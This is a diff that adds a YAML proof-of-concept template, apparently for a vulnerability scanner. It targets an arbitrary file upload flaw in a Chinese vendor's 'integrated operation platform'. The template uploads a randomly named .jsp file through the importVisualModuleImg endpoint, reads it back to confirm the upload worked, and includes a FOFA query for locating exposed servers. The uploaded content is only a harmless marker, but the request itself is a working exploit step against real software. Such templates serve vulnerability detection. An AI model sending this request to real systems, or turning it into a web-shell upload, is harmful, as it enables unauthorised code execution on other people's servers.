@@ -1,0 +1,31 @@
+id: poc-yaml-integrated-operation-platform-importvisualmoduleimg-anyfile-upload
+info:
+  name: 北京中科聚网一体化运营平台 importVisualModuleImg 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 一体化运营平台
+  fofa: title="一体化运营平台" || body="thirdparty/ueditor/WordPaster"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /manage/tplresource/importVisualModuleImg?moduleId=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----9979a3f1-cdb1-43af-af88-a9b48b67cf71
+  data: '------9979a3f1-cdb1-43af-af88-a9b48b67cf71
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: multipart/form-data
+
+
+    {{.t2}}
+
+    ------9979a3f1-cdb1-43af-af88-a9b48b67cf71--'
+  expression: status_code == 200 && contains(body,`files/visual/img`)
+- method: GET
+  path: /files/visual/img/1/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
